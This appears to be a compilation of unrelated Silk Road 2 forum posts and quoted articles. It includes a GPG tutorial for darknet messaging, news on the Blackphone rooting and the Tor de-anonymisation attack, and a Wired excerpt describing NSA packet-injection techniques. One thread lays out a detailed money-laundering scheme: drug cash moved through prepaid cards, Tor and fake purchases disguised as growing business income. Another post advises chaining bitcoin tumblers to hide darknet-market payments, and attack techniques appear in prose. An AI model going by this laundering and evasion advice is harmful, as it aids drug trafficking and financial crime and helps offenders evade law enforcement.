Then you can use the Insert My Key command, Shift-Command-K -- this will bring up a little dialog box, where you can choose your key from the drop-down box; click Choose Key, and the key will be inserted into your TextEdit document.  You can then use Command-A to highlight the key, and Command-C to copy it to the clipboard. You can then use Command-V to paste your public key into a PM (to me) for example.   N.B.: To properly be able to import PGP into GPGChain (via TextEdit) you need to change the default on TextEdit from .rtf to plain text. You can do that through the Format menu, or you can go through the main configuration menu, accessible by using Command-comma. Ensure the plain text radio button is selected.Also ensure that the following are UNCHECKED in TextEdit preferences: smart quotes, smart dashes, smart links.   To select text within TextEdit, use Command-A to highlight the entire document, or use your mouse to selection the section that you want to verify/sign/encrypt/decrypt. It is highly recommended that you use only plain-text, as opposed to Rich Text (.rtf) format. Use Command-comma to bring up Preferences and ensure that the plain text radio button is checked.  Once your text is highlighted in TextEdit, (by pressing Comand-A) you then encrypt using Shift-Command-E. You will then be presented with a list of keys to encrypt to, that you have added to your PGP keyring:  Other Commands You May Need: ============================  OpenPGP: Decrypt File:                   Control-Command-D  OpenPGP: Encrypt File:                   Control-Command-E  OpenPGP: Sign File:                      Control-Command-S  OpenPGP: Verify Signature of File:       Control-Command-V   Once you have setup these shortcuts, you can begin using GPG.  To encrypt a message to someone using GPG, you first need a copy of the recipient's PGP public key.  Once you have located someone's PGP public key, you should copy and paste it into TextEdit. Save the PGP key to a file; you can call the file, import.asc (or import.txt), for example. This saved file will usually be found in the Documents folder.  Launch GPG Keychain Access from the Applications folder. click on the Import icon in the upper left hand corner. GPG Keychain Access will then prompt you for the name of the file which contains the key to import. It will usually show you a list of files in the Documents folder. Click on the file named import.asc (or import.txt), and click ok. The PGP public key will then be imported into your PGP keyring.   To encrypt a message to a person, the message must be contained in a TextEdit document. Use Command-A to hightlight the entire document. Then use Shift-Command-E to encrypt. GPG will pop-up a list of public keys in your PGP keyring. Each key will have a little checkbox beside it which you can check, to select that particular key. If you were encrypting a message to me, you would put a check in the box beside my PGP key (Nightcrawler@SR).  When you click on OK, the plaintext (unencrypted) message in TextEdit will be replaced with the encrypted message. You can then copy and paste the encrypted message to enter it into a form on Silk Road, or anywhere else that it needs to go.  To decrypt a message sent to you by other people, you need to copy that message to the clipboard, and paste it into a TextEdit document. Again use Command-A to highlight all the encrypted message. Then use Shift-Command-D to decrypt the message. If the message is encrypted to your PGP public key, you will be prompted to enter your passphrase. Once the correct passphrase has been entered, and you click OK, then the message will be decrypted, and the decrypted text will be placed in the TextEdit document, replacing the encrypted message that was there previously.

Where security differs from religion is that security is NOT retroactive.  Unlike Christianity, where you can come to Jesus, be 'saved' and have all  your sins washed away, with security you can adopt Tails or PGP, and be  secure from that point forward, but rest assured that your previous sins  (security failings) WILL come back to haunt you and bite you in the ass.

THE BLACKPHONE, which Silent Circle claims to be the world's most secure phone, reportedly has been hacked at the Def Con hacker conference in Las Vegas.  Hacker Justin Case, who is known as @TeamAndIRC, claimed to find three vulnerabilities and hack the phone on three separate occasions to gain root access, announcing his findings on Twitter.  However, the tweets caused a bit of a stir among security experts, as the first hack supposedly was accomplished on an unpatched version of Android.  Blackphone's CSO Dan Ford responded to @TeamAndIRC in a blog post and said that he didn't consider the debugging attack to be a vulnerability because the Android Debugging Bridge is part of Android.  ""In the final days before manufacture, a bug was found with ADB on the Blackphones which could throw the phone into a boot loop when full device encryption was turned on,"" Ford explained.  ""Rather than miss the manufacturing window or cause user grief, the developer menu was turned off. Disabling ADB is not a security measure, and was never meant to beâ-âit will be returning in an OTA to Blackphone in the future once the boot bug is resolved; the realities of getting a product manufactured and shipped within the available manufacturing window meant a quick fix was needed.""  Ford added that no root or other privilege escalation was required in order to perform this.  But @TeamAndIRC went ahead and did it again via what he claimed was a ""remotewipe app"" running as system, which he said ""is debuggable, attach debugger get free system shell"".  However, Blackphone insisted that the hacks @TeamAndIRC found require user consent, as the vulnerabilities he found are not exploitable via a drive-by-download or other remote activities and will further require intentional user interaction.  ""We are under the impression that this vulnerability affects many OEMs and not just Blackphone. When the vulnerability becomes public, we will implement the fix faster than any other OEM,"" Ford responded.  ""This would mean the user lost physical control of their Blackphone or they wanted to walk around with an exploitable smartphone. Nonetheless, we have a vulnerability and it is important to Blackphone to resolve this vulnerability fast.""  The third and final vulnerability @TeamAndIRC found he was not willing to discuss, but described it as ""system user to root, many available"".  ""I would like to thank him for not blowing the issue out of proportion and going back to the twittersphere for a little more transparency by explaining that direct user interaction is required and that we had already patched one of the vulnerabilities through the OTA update,"" Ford added.  The Blackphone is a collaboration between security firm Silent Circle and Geeksphone to make a smartphone running the firm's custom PrivatOS, which it touted as ""the phone no-one has dared to make yet"".  The Blackphone is centered around privacy, and the company is keen to point out that while Google's Android mobile operating system is at its core, it's much more secure than the present influx of smartphones running Android. This is fortunate, based on the latest Android security statistics, which reveal that it is the target for 98 percent of all mobile malware.",""

In part, it relied on an already-patched problem in Blackphoneâs remote wipe software, which Sawyer hadnât downloadedâmostly because he bought the phone at Def Con and didnât want to do anything over the Wi-Fi at the conference.In a conversation with Ars, Sawyer said that the hack required three vulnerabilities in allâone that is a lower-threat vulnerability to a wide range of Android-based devices and has not yet been fully disclosed. Additionally, he said, the rooting of the Blackphone required that the attacker:-have physical access to the phone and connect it to a computer via USB,-configure the phone against Blackphoneâs set-up recommendations,-not install encryption on the device,-ignore an unknown application source warning, and-have the phoneâs PIN code.In other words, to hack the Blackphone, the hacker would have to have either obtained it from a very naÃ¯ve user or bought the phone himself."

The Tor Project said that it believed the assault was designed to de-anonymise the net addresses of people operating or visiting hidden sites.  However, it said it was not sure exactly how users had been ""affected"".  The project added that it believed it had halted the attack on 4 July.  Tor allows people to visit webpages without being tracked and to publish sites whose contents does not show up in search engines.  The Tor Project said it believed that the infiltration had been carried out by two university researchers, who claimed at the start of July to have exploited ""fundamental flaws"" in Tor's design that allowed them to unmask the so-called dark net's users.  The two security experts, Alexander Volynkin and Michael McCord, had been due to give a talk at the Black Hat conference in Las Vegas next week. However, the presentation was cancelled at the insistence of lawyers working for their employer, Carnegie Mellon University.  Tor web page The Tor Project offers web browser software that can access the hidden sites on the Tor network ""We spent several months trying to extract information from the researchers who were going to give the Black Hat talk, and eventually we did get some hints from them... which is how we started looking for the attacks in the wild,"" wrote Roger Dingledine, one of the network's co-creators, on the Tor Project's blog.  ""They haven't answered our emails lately, so we don't know for sure, but it seems likely that the answer to [whether they were responsible] is yes.  ""In fact, we hope they were the ones doing the attacks, since otherwise it means somebody else was.""  A spokesman from Carnegie Mellon University declined to comment.  Illegal activity Tor attempts to hide a person's location and identity by sending data across the internet via a very circuitous route involving several ""nodes"" - which, in this context, means using volunteers' PCs and computer servers as connection points.  Encryption applied at each hop along this route makes it very hard to connect a person to any particular activity.  To the website that ultimately receives the request, it appears as if the data traffic comes from the last computer in the chain - known as an ""exit relay"" - rather than the person responsible.  Tor graphic Tor hides a user's identity by routing their traffic through a series of other computers Tor's users include the military, law enforcement officers and journalists - who use it as a way of communicating with whistle-blowers - as well as members of the public who wish to keep their browser activity secret.  But it has also been associated with illegal activity, allowing people to visit sites offering illegal drugs for sale and access to child abuse images, which do not show up in normal search engine results and would not be available to those who did not know where to look.  Two-pronged attack The Tor Project suggests the perpetrator compromised the network via a ""traffic confirmation attack"".  This involves the attacker controlling both the first part of the circuit of nodes involved - known as the ""entry relay"" - as well as the exit relay.  By matching the volumes and timings of the data sent at one end of the circuit to those received at the other end, it becomes possible to reveal the Tor user's identity because the computer used as an entry relay will have logged their internet protocol (IP) address.  The project believes the attacker used this to reveal hidden-site visitors by adding a signal to the data sent back from such sites that included the name of the hidden service.  Because the sequence of nodes in a Tor network is random, the infiltrator would not be able to track every visit to a dark net site.  Onion Tor can be likened to an onion because of the many layers through which it sends data Tor also has a way of protecting itself against such a danger: rather than use a single entry relay, the software uses a few relays chosen at random - what are known as ""entry guards"".  So, even if someone has control of a single entry and exit relay, they should only see a fraction of the user's traffic, making it hard to identify them.  However, the Tor Project believes the perpetrator countered this safeguard by using a second technique known as a ""Sybil attack"".  This involved adding about 115 subverted computer servers to Tor and ensuring they became used as entry guards. As a result, the servers accounted for more than 6% of the network's guard capacity.  Black Hat Two researchers had planned to reveal a way to unmask Tor users at the Black Hat conference This was still not enough to monitor every communication, but was potentially enough to link some users to specific hidden sites.  ""We don't know how much data the attackers kept, and due to the way the attack was deployed, their... modifications might have aided other attackers in de-anonymising users too,"" warned Mr Dingledine.  Several government agencies are interested in having a way to unmask Tor's users.  Russia's interior ministry is currently offering a 3.9m roubles ($110,000; Â£65,000) prize to anyone who cracks such identities. It says it wants to protect the country's ""defence and security"".  A report by the German broadcaster ARD suggests US cyberspies working for the NSA have also made efforts to overcome Tor's system, despite the fact the Tor Project is partly funded by other US government departments.  And leaked documents released by whistleblower Edward Snowden also indicate the UK's GCHQ has attempted to track Tor users.",""

Torchat works by having each user run a hidden service on their computer/tor instance.  Your torchat ID is taken from your hidden service Onion address, which comes from the public part of a 1024 RSA key.  When you initially connect with someone via torchat, your chat client sends a random nonce to the onion address of your chat partner.  Your chat client then reads the nonce back through a separate circuit created by your chat partner connecting to your hidden service.  In such a manner both IDs are authenticated via the tor network.  Torchat encryption is end to end... but only so far as the basic encryption Tor uses to create its onion layers.  Torchat adds nothing above and beyond that, which may be troubling in our world of NSA's ""store everything"" approach.  If the NSA has a real hard-on for your particular conversation and happened to have sotred it and isolated it through traffic analysis, they might be able to crank away at those weak 1024 bit keys and own your conversation.  OTR chat over Tor seems to be more secure in that OTR crypto is strong and uses continually ratcheting ephemeral Diffe-Helman keys during the conversation for strong perfect forward secrecy.  Only downside is that OTR chat has to go through a central server like Jabber.  OTR crypto is end-to-end, but you still leave metadata in a central location (covered by Tor, if you're using it).",""

"Silk Road 2 Forums","satisfried","2996","2013-11-13T15:41:55","Wired Article about New NSA De-anonymizing Techniques","Discussion/Security","The QUANTUMCOOKIE attack is very alarming to me.  Would the NSA be trying this type of attack on SR users?  How can this type of attack be circumvented?  The text below is just an excerpt taken from the full Wired Article. Read the full article here: http://www.wired.com/opinion/2013/11/this-is-how-the-internet-backbone-has-been-turned-into-a-weapon/  ""User Identification  User cookies, those inserted by both advertising networks and services, also serve as great identifiers for NSA targeting. Yet a web browser only reveals these cookies when communicating with such sites. A solution lies in the NSAâs QUANTUMCOOKIE attack, which theyâve utilized to de-anonymize Tor users.  A packet injector can reveal these cookies by replying to an unnoticed web fetch (such as a small image) with a HTTP 302 redirect pointing to the target site (such as Hotmail). The browser now thinks âhey, should really go visit Hotmail and ask it for this imageâ. In connecting to Hotmail, it reveals all non-secure cookies to the wiretap. This both identifies the user to the wiretap, and also allows the wiretap to use these cookies.  So for any webmail service that doesnât require HTTPS encryption, QUANTUMCOOKIE also allows the wiretap to log in as the target and read the targetâs mail. QUANTUMCOOKIE could also tag users, as the same redirection that extracts a cookie could also set or modify a cookie, enabling the NSA to actively track users of interest as they move across the network â although there is no indication yet that the NSA utilizes this technique. User Attack  The NSA has a collection of FOXACID servers, designed to exploit visitors. Conceptually similar to Metasploitâs WebServer browser autopwn mode, these FOXACID servers probe any visiting browser for weaknesses to exploit.  All it takes is a single request from a victim passing a wiretap for exploitation to occur. Once the QUANTUM wiretap identifies the victim, it simply packet injects a 302 redirect to a FOXACID server. Now the victimâs browser starts talking to the FOXACID server, which quickly takes over the victimâs computer. The NSA calls this QUANTUMINSERT.  The NSA and GCHQ used this technique not only to target Tor users who read Inspire (reported to be an Al-Qaeda propaganda magazine in the English language) but also to gain a foothold within the Belgium telecommunication firm Belgicom, as a prelude to wiretapping Belgium phones.  One particular trick involved identifying the LinkedIn or Slashdot account of an intended target. Then when the QUANTUM system observed individuals visiting LinkedIn or Slashdot, it would examine the HTML returned to identify the user before shooting an exploit at the victim. Any page that identifies the users over HTTP would work equally well, as long as the NSA is willing to write a parser to extract user information from the contents of the page.  Other possible QUANTUM use cases include the following. These are speculative, as we have no evidence that the NSA, GCHQ, or others are utilizing these opportunities. Yet to security experts they are obvious extensions of the logic above.  HTTP cache poisoning. Web browsers often cache critical scripts, such as the ubiquitous Google Analytics script âga.jsâ. The packet injector can see a request for one of these scripts and instead respond with a malicious version, which will now run on numerous web pages. Since such scripts rarely change, the victim will continue to use the attackerâs script until either the server changes the original script or the browser clears its cache.  Zero-Exploit Exploitation. The FinFly âremote monitoringâ hacking tool sold to governments includes exploit-free exploitation, where it modifies software downloads and updates to contain a copy of the FinFisher Spyware. Although Gamma Internationalâs tool operates as a full man-in-the-middle, packet injection can reproduce the effect. The injector simply waits for the victim to attempt a file download, and replies with a 302 redirect to a new server. This new server fetches the original file, modifies it, and passes it on to the victim. When the victim runs the executable, they are now exploited â without the need for any actual exploits.  Mobile Phone Applications. Numerous Android and iOS applications fetch data through simple HTTP. In particular, the âVulnaâ Android advertisement library was an easy target,  simply waiting for a request from the library and responding with an attack that can effectively completely control the victimâs phone. Although Google removed applications using this particular library, other advertisement libraries and applications can present similar vulnerabilities.  DNS-Derived Man-in-the-Middle. Some attacks, such as intercepting HTTPS traffic with a forged certificate, require a full man in the middle rather than a simple eavesdropper. Since every communication starts with a DNS request, and it is only a rare DNS resolver that cryptographically validates the reply with DNSSEC, a packet injector can simply see the DNS request and inject its own reply. This represents a capability upgrade, turning a man-on-the-side into a man-in-the-middle.  One possible use is to intercept HTTPS connections if the attacker has a certificate that the victim will accept, by simply redirecting the victim to the attackerâs server. Now the attackerâs server can complete the HTTPS connection. Another potential use involves intercepting and modifying email. The attacker simply packet-injects replies for the MX (Mailserver) entries corresponding to the targetâs email. Now the targetâs email will first pass through the attackerâs email server. This server could do more than just read the targetâs incoming mail, it could also modify it to contain exploits.""",""

USA LE focus on SR and darknet appears to be currently driven by that gangster Senator Charles Schumer and his cronies.  Schumer seems to have a real hard on regarding illegal drug traffic.  Not sure where this comes from.  BUT, I would argue that federal LE doesn't give a fuck about people buying drugs on darknet.  They are concerned with BTC and the massive foundation that darknet drug deals provide to the currency.  BTC is the threat.  Drug sales is just the middleman problem that makes the threat more significant.

Saudi Arabia May Be Tied to 9/11, 2 Ex-Senators Say  http://www.nytimes.com/2012/03/01/us/graham-and-kerrey-see-possible-saudi-9-11-link.html?_r=0  WASHINGTON â For more than a decade, questions have lingered about the possible role of the Saudi government in the attacks on Sept. 11, 2001, even as the royal kingdom has made itself a crucial counterterrorism partner in the eyes of American diplomats.   Now, in sworn statements that seem likely to reignite the debate, two former senators who were privy to top secret information on the Saudisâ activities say they believe that the Saudi government might have played a direct role in the terrorist attacks.  âI am convinced that there was a direct line between at least some of the terrorists who carried out the September 11th attacks and the government of Saudi Arabia,â former Senator Bob Graham, Democrat of Florida, said in an affidavit filed as part of a lawsuit brought against the Saudi government and dozens of institutions in the country by families of Sept. 11 victims and others. Mr. Graham led a joint 2002 Congressional inquiry into the attacks.  His former Senate colleague, Bob Kerrey of Nebraska, a Democrat who served on the separate 9/11 Commission, said in a sworn affidavit of his own in the case that âsignificant questions remain unansweredâ about the role of Saudi institutions. âEvidence relating to the plausible involvement of possible Saudi government agents in the September 11th attacks has never been fully pursued,â Mr. Kerrey said.  Their affidavits, which were filed on Friday and have not previously been disclosed, are part of a multibillion-dollar lawsuit that has wound its way through federal courts since 2002. An appellate court, reversing an earlier decision, said in November that foreign nations were not immune to lawsuits under certain terrorism claims, clearing the way for parts of the Saudi case to be reheard in United States District Court in Manhattan.  Lawyers for the Saudis, who have already moved to have the affidavits thrown out of court, declined to comment on the assertions by Mr. Graham and Mr. Kerrey. âThe case is in active litigation, and I canât say anything,â said Michael K. Kellogg, a Washington lawyer for the Saudis.  Officials at the Saudi Embassy in Washington, who have emphatically denied any connection to the attacks in the past, did not respond Wednesday to requests for comment.  The Saudis are seeking to have the case dismissed in part because they say American inquiries â including those in which Mr. Graham and Mr. Kerrey took part â have essentially exonerated them. A recent court filing by the Saudis prominently cited the 9/11 Commissionâs âexhaustiveâ final report, which âfound no evidence that the Saudi government as an institution or senior Saudi individuals fundedâ Al Qaeda.  But Mr. Kerrey and Mr. Graham said that the findings should not be seen as an exoneration and that many important questions about the Saudisâ role had never been fully examined, partly because their panels simply did not have the time or resources given their wider scope.  Terry Strada of New Vernon, N.J., whose husband died in the World Trade Center, said it was âso absurd that itâs laughableâ for the Saudis to claim that the federal inquiries had exonerated them.  Unanswered questions include the work of a number of Saudi-sponsored charities with financial links to Al Qaeda, as well as the role of a Saudi citizen living in San Diego at the time of the attacks, Omar al-Bayoumi, who had ties to two of the hijackers and to Saudi officials, Mr. Graham said in his affidavit.  Still, Washington has continued to stand behind Saudi Arabia publicly, with the Justice Department joining the kingdom in trying to have the lawsuits thrown out of court on the grounds that the Saudis are protected by international immunity.  State Department officials did not respond to requests for comment on Wednesday on the impact of the court declarations.  The senatorsâ assertions âmight inject some temporary strain or awkwardness at a diplomatic level,â said Kenneth L. Wainstein, a senior national security official in the George W. Bush administration. Even so, he said, âthe United States and the Saudis have developed strong counterterrorism cooperation over the last decade, and that relationship will not be undermined.â ","FDR created acronyms AND jobs during the Great Depression.

First, you'd want to turn the cash into cryptocurrency like bitcoin so you could make anonymous purchases back to your business that seem like they're coming from real customers.  Going from your debit, to coinbase, to blockchain, etc. won't work, because the money would have to be in your bank account to begin with, and that's what we're trying to avoid.  Plus, having all your purchases come from the same few BitCoin wallets might be a little suspect.   And using reloable pre-paid cards is a no-go, because of the ""Know Your Customer"" Regulation.  BUT... one-time-use cards could be an option since it would untrackable back to you.   =================================SO HOW DO WE DO IT?=================================  It seems possible that you could set up a website or seller account somewhere, and sell some digital item or service for like $500 or something. Ebooks baby!     Then, you could use those pre-paid cards via a credit-card masking service to purchase your product, so the purchases seem like they're coming from different real people each time from all over the planet...  IF... the masking service allows you to mask anonymous gift cards like that. If it doesn't have to be a debit card attached to your identity, you're golden homeboy.  And using Tor, the I.P. address wouldn't be trackable, but I don't know if PayPal even records that info when you make a purchase. Probably so. But I think you  should be ok...  To PayPal, it seems like you're selling your products to lots of customers from all over the place, and looks like legit income you can claim and pay taxes on.  It would even keep track of all your sales for you in case you were audited     You may want to take additional steps to use the pre-paid debit cards to purchase BitCoin and use the BitCoin to make some purchases, or transfer BACK to a different  card to spend. But I think that may be overkill.  BUT - if you made BitCoin purchases back to your business, you could sell more  expensive products to yourself, making for less transactions and possibly less of  a headache, as a single $5,000 transaction makes up for ten $500 transactions. Since one-time-use cards have a limit on them.   =================================THE IDEAL SOLUTION=================================  Ideally, you could use the cash to purchase anonymous prepaid-cards, and then transfer those cards onto an anonymous account, and then could use that  account to make anonymous purchases through a credit-card masking service.   Essentially, if there was a way to make purchases from your anonymous BitCoin walletlook like they came from various credit cards, and not a BitCoin wallet, that would be PERFECT.

I write sales copy, which is an expensive service, and large purchases would blend in with the rest of the work I already do.  I just thought it would be less suspicious than to walk into my bank once a  week with several thousand dollars in cash and say:  ""I've been selling beats like crazy yo'  ""  Granted, maybe I'm overthinking things. I was trying to avoid taking cash to the bank. But perhaps if I can make it look legit (piece of cake) and don't get greedy, it shouldn't be a problem.

"Silk Road 2 Forums","SilverTongue","59661","2014-09-29T18:40:22","How Do You Go From Cash to BitCoin to ""Legit"" Income?","Discussion/Legal","Hey Digital,  Making the cash, sitting on it, and having a biz to cover my ass is the easy part. I'm fully confident I could do that no problem. I even have a legal business entity to make it all seem official too.  I was looking to see if there was a way to do it digitally, to avoid the large sums of cash that could raise more suspicion. Money being deposited to my bank via a paypal business account is less suspicious than me walking in with lots of cash.   I guess the trade-off is that ditigal purchases are more trackable. Which is why I was wondering if there was a way to take the cash, and turn it into ditigal currency.  Then make anonymous purchases back to yourself online, combined with other REAL sales to people online for same biz, so it blends in. Just like it would with cash and a bar.  If I already do X amount of business online already, boosting it at a slow pace over time with fake anonymous sales would look like I was simply growing my business over time.  For example, if I was already doing $5,000 of LEGIT business online, I could do another  $2,500 in fake and it's not that much of a difference. Slowly grow it to $5,000 over a  couple months, then $7,500, and so on.  Plus, with writing copy, it's a high-priced service, so I could make one fake purchase of $2,500 and be done with it. It's not like I'd have to make 10 $250 purchases.  I know I could become a cash kingpin, but I'm trying to think long term as to how I  could turn that cash into assets.  Thanks for all your replies amigo   ",""

There's an even more obvious reason, and it's that coming up with a water-tight money laundering scheme like OP's asking for takes serious time, effort and know-how from someone with a very specific skill-set. That shit don't come cheap. No way anyone's doing that for free.  A lot of people on this forum want something for nothing. Like that thread from a few days ago asking for a LawyerX thread; the implication being that some poor sap is expected to spend years working his or her way through law school to have the immense privilege of fielding, more or less pro bono, a bunch of questions from people asking if having their dope sent to their address in someone else's name will protect them from prosecution.

"Silk Road 2 Forums","Agent","5489","2013-12-02T18:25:31","Free tumblers?","Discussion/Security","The point of tumbling is to break any link in the blockchain that might be followed back to where the Bitcoins were first purchased and where they ended up last. BitcoinFog charges a one to three percent because it helps fund the pool and server that BitcoinFog runs on as well as disguise the amount you are tumbling. Blockchain.info uses a similar service that only charges a zero point five percent fee for the same reason.  It would be hard for anyone to run a free tumbling service due to the costs of hardware and network bandwidth so this is just something you have to factor in when purchasing your Bitcoins to send to a marketplace.  X + Y + Z = total needed to add onto initial purchase. ( exchange fee, tumbling fee and network transfer fee ) so when adding it all up you should do your math as such.  Total amount for product plus shipping if any and add the total percentage of X, Y and Z.  It is always best to use multiple tumbling services to ensure you do break any form of connection that can be made as this is an easy way to throw people off your trail of Bitcoin purchases. BitcoinFog and Blockchain.info's shared services are the most known and common but there are at least one or two more services similar to BitcoinFog out there that might suit you if they have a lower tumbling fee or a quicker process.  Just one last note, you should always leave your Bitcoins in your BitcoinFog account for at least twenty-four hours so that they are mixed among other peoples, this can be done easily by using the delayed timer on the withdraw page they have.",""

Usually, people stick them in an encrypted container (folder, filesystem, etc) and unlock the whole container when they want to access them.

So even if you're sticking all of those files in an encrypted container (or just PGPing them individually), you'll probably want to run Full Disk Encryption on the machine as well, as a hedge against someone recovering the cached copies.

Shared coin uses shared send but it also uses taint analysis to ensure that there is no connection between the address sending and receiving.  It does this by enabling a repetition feature which runs the taint analysis and performs a new shared send to get rid of the taint.  The more repetitions you perform the more likely the taint will be zero.  Each repetition costs .0005 bitcoins whereas shared send costs .5% of the sent amount.

When i plug in my thumb drive it'll show a message on my screen saying ""Drive not readable"" To some it may seem like a corrupted/broken drive but to me, its encrypted! All i have to do is open up TrueCrypt, mount my device and my files will show up. After im done with everything, i dismount my drive and unplug the USB drive. After a drive encryption, you must have TrueCrypt in order to use that drive. But do not download TrueCrypt and try to encrypt your device without experience!

Just be careful when encrypting devices, you might fuck up.   http:// www.truecrypt . org/downloads  Obviously clear net, just removes spaces in the link and you're good to go.",""

I have a bit of a situation and was wondering if any one had some advise.  On the last upgrade on tails I lost the persistent volume in the installation proccess. On this persistent volume I had my private pgp key, and well lets just say I need to decrypt a msg of utmost importance so I must get the private key that was on the now formatted and new version of tails.  So basicly I'm going to attempt to use a linuxed base recovery program to try and salvage the info. Problem is if I'm lucky and I'm able to salvage the info I don't really know what I'm looking for, technecly the private key but I really doubt it's going to be in the "".asc"" format. I'm guessing I'll have to go into the pgp directory of tails...  If any one has dealt with this kinda of thing before or if you have any ideas I'm all ears, also I'd like to hear suggestions on a linux based recovery program.  Thanks, much apprecciated!!!  KV",""

The downward movement comes thanks to news, first reported by Forbes, that, as of this morning, the FBI has located and seized an additional 144,000 bitcoins â valued at approximately $28.5 million at the time â believed to belong to jailed Silk Road founder Ross Ulbricht.  Itâs already the biggest seizure in bitcoin history and yet, there is another account containing an additional 111,000 bitcoins that have yet to be seized but are believed to belong to Ulbricht. One explanation given for this is that the FBI may not possess the private key required to gain access to the wallet.  As of 2:45pm PST today, the trading price at Mt. Gox was $190.03, up from an intraday low of $176.60, but still down nearly 10 percent from the $209.00 value at which it started the day.  Prior to today, bitcoin largely seemed to have survived the FBI action against Silk Road road unscathed. The price dropped briefly, following the October 2 news announcement, but has since rebounded and seen the aforementioned price appreciation. At the time, the FBI had seized approximately 32,000 bitcoins worth $3.5 to $4 million at the time and $6 million at todayâs prices.  The question bitcoin bulls will need to ask themselves then is whether the market will see the same temporary correction this time around or whether this is a sign of more pain to come.  There are a few differences between the earlier seizure and todayâs. First, the number of bitcoins in question is greater by a factor of 4.5. Ulbrichtâs bitcoin holdings are likely among the largest in the world. The total number of bitcoins in circulation today is approximately 11.9 million, which at current market value represents approximately $2.26 billion.  The 176,000 bitcoinS seized from Ulbricht over the last month represent approximately 1.5 percent of this total circulation. Add in the additional 111,000 bitcoins, and that number jumps to 2.4 percent.  Silk Road allegedly generated commission revenue of approximately 600,000 bitcoin over its lifetime on 9.5 million bitcoin worth of sales, but reinvested much of that sum back into the business. There may, however, be additional undiscovered holdings belonging to Ulbricht, that if found would increase the FBIâs holdings.  Any time large holdings in a single currency or commodity change hands, it can create instability, particularly when law enforcement is involved. The FBI has said previously that it plans to plans to exchange the seized bitcoins for dollars, assuming Ulbricht is convicted at trial or settles. Doing so, if not done thoughtfully and patiently, could flood the bitcoin market and send the price of the currency plummeting.  A Reddit thread has been created which identifies the FBI bitcoin wallet, and many users are using micro-transactions to send (mostly humorous) public messages to the account.  Bitcoin has shown surprising resiliency, regaining much of the value lost following the Department of Homeland Securityâs seizure of Dwolla and Bank of America accounts belonging to the worldâs top exchange, Tokyo-based Mt. Gox, and subsequently propping itself up in the face of the ongoing Silk Road fallout.  There are plenty of arguments to make for why bitcoin is a viable alternative currency, including freedom from governmental manipulation and inflation protection. But it will need to survive regular interference from law enforcement, and the resulting near-term uncertainty if it is to make it that far.  It would seem that we remain closer to the beginning than to the end of this saga.""",""

"Silk Road 2 Forums","99herps","13229","2014-01-01T16:59:44","Actual localbitcoin experiences, for your entertainment","Discussion/Legal","I don't use LBC personally, but I'm always collecting real accounts of money movement that goes right or wrong.  So many people here suggest using LBC that, after reading this below, I wonder how many of them actually use LBC regularly without incident?    Easy like Sunday morning  When we last left our intrepid heroes, UberJumper and his nameless (and unlucky) friend, they were meeting random strangers in parking lots and banks, only to be offered sacks full of unactivated Amazon gift cards and rubber checks in exchange for their hoard of early adopter bitcoins. That was weeks ago, and today weâre going to catch up and see how successful theyâve been.  One suggestion that came up over and over again was that they register and confirm their identities with Canadian exchange site CaVirtEx, and cash out there, since Mt Gox has a waiting list that extends into 2015 and other sites are even sketchier. The Canadian Bitcoin ATM is located in another city and wouldnât be able to handle the volume theyâre exchanging. So they finally ended up verified and find themselves halted yet again:  This is awesome. My friend dumps 5 bitcoins on Virtex to sell. Then tries to cash out his monthly max of 3k, and his account is immediately flagged as suspicious and locked. emot-allears  It was then noted that CaVirtEx has excessively sensitive automated ban/warning systems.  We shall see how long it takes for them to respond to him. Considering it already takes a week apparently for them to send the money via wire transfer.  Someone explain to me how this is easier than paypal?  No one could provide an answer, and as time progressed, UberJumperâs frustration grew more and more apparent.  This is fucking retarded. Virtex is apparently so backlogged, the current estimate on getting verified is over a month. In the mean time Virtex holds everything you have on their site hostage.  We have tried to sell butts for the last 2.5 weeks, and we have only sold a grand total of 11 butts (i.e. gotten money for it), on top of this all of those sales came when we were selling for less than half the price.  With the price of bitcoin going up up up, i find it hilarious that trying to actually get something useful out of the stupid internet coins has been so fucking difficult.  Does anyone have an idea of how to cash out?  Yet again, gift cards were brought up.  Gyft doesnât sell gift cards that work in Canada. Also Ebay does not allow reselling of gift card codes: http://pages.ebay.com/help/policies/gift.html  Resident idiot/troll how!! suggested meeting local weirdos from Craigslist, because he canât seem to pay attention to the situation at hand.  Isnât that what localbitcoins is for? We tried that and it was a tedious as fuck process, and we sold almost nothing. We try posting it on Kijiji, and got a single hit. So please tell me where the fuck are these magical people who are jumping over each other to buy bitcoin with cash.  These magical people are all apparently college kids buying weed on Silk Road, which had been closed down for nearly two months by this time. Every âreplacementâ Silk Road site has turned out to be a honeypot or a scam. how!! is clearly lying, but that was never really in doubt.  In response to yet another fool being parted with his money:  I find it funny that Bitcoin is what 1,000$, yet he is selling for less than half of that.  Tomorrow i get to go with my friend and meet two buyers  emot-allears  Does anyone know if you can go into a bank and have them check a cashiers check to make sure its legit?  The next day:  Ugh went with my friend to meet 2 buyers. Story time  emot-allears  We go to meet the first buyer at a bank, who wanted a 120$ in BTC. He didnât show up at all, finally we call him and turns out he changed his mind and doesnât want any after-all. So basically he wasted our time.  Yay  The second buyer was someone who contacted my friend through kijiji, and was interested in buying 25 coins at 500$/coin. We drove our asses out to the starbucks he wanted to meet us at, and fuck. This guy was a captain of industry, all he was missing was a fucking fedora.  He immediately started interrogating us on why we are selling, and lecturing us on how âselling at a low price is damaging the local bitcoin ecosystemâ. I pointed out we wanted actual real money, so we can buy stuff with, and i donât give a fuck about the ecosystem. The buttcoiner then proceeded to ramble on about all the awesome ways you can spend bitcoins, and other stupid shit, but he still wants to buy our coins if we are willing to give him 10 minutes of our time. Fine. He then rambles on and on about bitcoins, and how amazing they are and all sorts of awesome stuff, then rambles on about his personal projects (some sort of bitcoin exchange that is going to make it big).  Finally he shut up, my friend gives him the wallet to show him the amount he is looking for there, he âchecksâ it. Then announces he is tipping us â0.05 BTC to thank us for hearing him outâ.  emot-smithicide  Then tells us he doesnât have the money, but if we were willing to âinvestâ 25BTC into his project, we could get a major stake in it. emot-wtc We left right then and there.  My friend is currently gungho on figuring out a way to use bitpay to cash out (which i am pretty sure violates their terms of service, and i have no idea the legality of what could happen there).  Bad gimmick poster My Linux Rig goes the tried and true route, suggesting using an exchange website, which was never ever suggested or even thought of before.  Then please tell me what exchange will deposit money into a Canadian bank account that is not Virtex?  Coinbase? America Only Mt Gox? My friend has been waiting a month now, and no indication of when he can get any money out. Mt Gox is as transparent as a brick wall with withdrawls. Bitstamp? Still waiting for verification CanadianBitcoins? Sketchy as fuck, you send them the coins, they mail you an envelope of cash.  Moving on:  Virtex has denied my friends identity verification and his account is now completely frozen. They give no explanation for what they want, or why it was denied.  emot-allears  